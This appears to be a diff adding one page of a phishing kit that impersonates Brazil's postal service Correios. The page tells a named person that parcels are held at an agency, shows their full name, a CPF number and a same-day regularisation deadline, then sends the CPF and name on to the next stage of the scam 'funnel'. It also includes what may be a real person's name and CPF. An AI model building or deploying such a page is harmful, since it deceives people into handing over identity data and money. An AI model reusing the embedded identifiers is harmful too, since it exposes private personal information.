@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script src="/funnel-tracking.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Correios | Confirmação</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link rel="stylesheet" href="../Correios%20_%20Rastreio_arquivos/bootstrap.css">
+  <link rel="stylesheet" href="../Correios%20_%20Rastreio_arquivos/app.css">
+  <link rel="stylesheet" href="../Correios%20_%20Rastreio_arquivos/yellow.css">
+  <link rel="stylesheet" href="../Correios%20_%20Rastreio_arquivos/all.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body {
+      background-color: white;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    main {
+      flex: 1;
+      padding: 40px 20px;
+      max-width: 1200px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    .confirmation-message {
+      color: #003157;
+      font-size: 16px;
+      font-weight: 400;
+      line-height: 1.5;
+      margin-bottom: 25px;
+      padding: 0;
+    }
+    .confirmation-message #nomeCliente {
+      font-size: 20px;
+      font-weight: 700;
+      color: #0066cc;
+    }
+    .confirmation-box {
+      background: #e9ecef;
+      padding: 25px 40px;
+      margin-bottom: 30px;
+      border: 1px solid #ddd;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .data-item {
+      padding: 10px 0;
+      font-size: 14px;
+    }
+    .data-label {
+      font-weight: 600;
+      color: #333;
+    }
+    .data-label::after {
+      content: " ";
+    }
+    .data-value {
+      color: #666;
+    }
+    .question {
+      text-align: center;
+      font-size: 15px;
+      font-weight: 400;
+      color: #333;
+      margin: 30px 0;
+    }
+    .button-container {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-top: 25px;
+      flex-wrap: wrap;
+    }
+    .btn-confirm {
+      background-color: #0066cc;
+      color: white;
+      padding: 12px 35px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 600;
+      transition: background-color 0.3s;
+    }
+    .btn-confirm:hover {
+      background-color: #0052a3;
+    }
+    .success-message {
+      background-color: #d4edda;
+      color: #155724;
+      padding: 12px;
+      border-radius: 4px;
+      text-align: center;
+      display: none;
+      margin-top: 20px;
+      border: 1px solid #c3e6cb;
+      font-size: 14px;
+    }
+    footer {
+      margin-top: auto;
+    }
+  </style>
+</head>
+<body>
+  <header class="w-100 font-size-16 font-weight-400 text-blue">
+    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
+      <span>Acessibilidade</span>
+      <i class="fas fa-caret-down ml-1"></i>
+    </div>
+    <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
+      <div class="menu-toggle" id="menu-toggle" style="width:50px">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+      </div>
+      <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
+        <a href="#" class="py-2">
+          <img src="../Correios%20_%20Rastreio_arquivos/correios.png" alt="Correios" height="25">
+        </a>
+      </div>
+      <div class="ml-4 d-none d-lg-block" style="width:150px">
+        <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
+          <img src="../Correios%20_%20Rastreio_arquivos/entrar.svg" alt="Correios" width="31">
+          <span class="ml-1">Entrar</span>
+        </a>
+      </div>
+    </nav>
+  </header>
+
+  <main>
+    <div class="confirmation-message">
+      <span id="nomeCliente">Jonathan Goncalves Rodrigues</span>, encontramos pedidos retidos em uma de nossas agências.
+    </div>
+
+    <div class="confirmation-box">
+      <div class="data-item">
+        <span class="data-label">Nome Completo:</span>
+        <span class="data-value" id="displayNome">Jonathan Goncalves Rodrigues</span>
+      </div>
+      <div class="data-item">
+        <span class="data-label">CPF:</span>
+        <span class="data-value" id="displayCpf">702.334.776-32</span>
+      </div>
+      <div class="data-item">
+        <span class="data-label">PRAZO PARA REGULARIZAÇÃO:</span>
+        <span class="data-value" id="displayPrazo">06/06/2026</span>
+      </div>
+    </div>
+
+    <div class="question">
+      Esse é você?
+    </div>
+
+    <div class="button-container">
+      <button class="btn-confirm" onclick="confirmarDados()">SIM, SOU EU!</button>
+    </div>
+
+    <div class="success-message" id="successMessage">
+      <i class="fas fa-check-circle"></i> Confirmação realizada com sucesso!
+    </div>
+
+    <section class="my-4" style="margin-top: 40px;">
+      <div>
+        <img src="../Correios%20_%20Rastreio_arquivos/banner-1.jpg" alt="" class="w-100">
+      </div>
+    </section>
+  </main>
+
+  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark w-100">
+    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+      <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
+      <ul style="list-style: none; padding: 0;">
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-desktop"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span class="text-wrap">Registro de Manifestações</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-question-circle"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span class="text-wrap">Central de Atendimento</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-briefcase"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span class="text-wrap">Solucões para o seu negócio</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-headset"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span class="text-wrap">Suporte ao cliente com contrato</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-comments"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span>Ouvidoria</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+      <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>
+      <ul style="list-style: none; padding: 0;">
+        <li class="mb-2 font-size-14">
+          <i class="far fa-address-card"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span>Identidade colaborativa</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-graduation-cap"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span>Educação e cultura</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-book"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span>Código de ética</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-file"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span class="text-wrap">Transparência e prestação de contas</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-file-pdf"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span class="text-wrap">Política de privacidade e Notas legais</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+      <h5 class="font-weight-700 mb-4">Outros Sites</h5>
+      <ul style="list-style: none; padding: 0;">
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-shopping-cart"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange" style="text-decoration: none;">
+            <span class="text-wrap">Loja online dos correios</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </footer>
+
+  <script>
+    function obterParametros() {
+      const params = new URLSearchParams(window.location.search);
+      return {
+        cpf: params.get('cpf') || localStorage.getItem('cpf') || '-',
+        nome: params.get('nome') || 'Cliente' || '-'
+      };
+    }
+
+    function formatarCPF(cpf) {
+      cpf = cpf.toString().replace(/\D/g, '');
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+
+    function obterDataAtual() {
+      const hoje = new Date();
+      return hoje.toLocaleDateString('pt-BR');
+    }
+
+    function inicializar() {
+      const dados = obterParametros();
+      const nome = decodeURIComponent(dados.nome);
+
+      document.getElementById('nomeCliente').textContent = nome;
+      document.getElementById('displayNome').textContent = nome;
+      document.getElementById('displayCpf').textContent = formatarCPF(dados.cpf);
+      document.getElementById('displayPrazo').textContent = obterDataAtual();
+
+      localStorage.setItem('clienteNome', nome);
+      localStorage.setItem('clienteCPF', dados.cpf);
+    }
+
+    function confirmarDados() {
+      const successMsg = document.getElementById('successMessage');
+      successMsg.style.display = 'block';
+
+      const btn = event.target;
+      btn.disabled = true;
+      btn.textContent = 'Confirmado!';
+
+      const dados = obterParametros();
+      const cpfLimpo = dados.cpf.replace(/\D/g, '');
+      const nomeEncodado = encodeURIComponent(dados.nome);
+
+      setTimeout(() => {
+        window.location.href = `../../../3/index.html?cpf=${cpfLimpo}&name=${nomeEncodado}`;
+      }, 1500);
+    }
+
+    window.addEventListener('DOMContentLoaded', inicializar);
+  </script>
+
+  <script src="../js/latest.js" async defer></script>
+</body>
+</html>
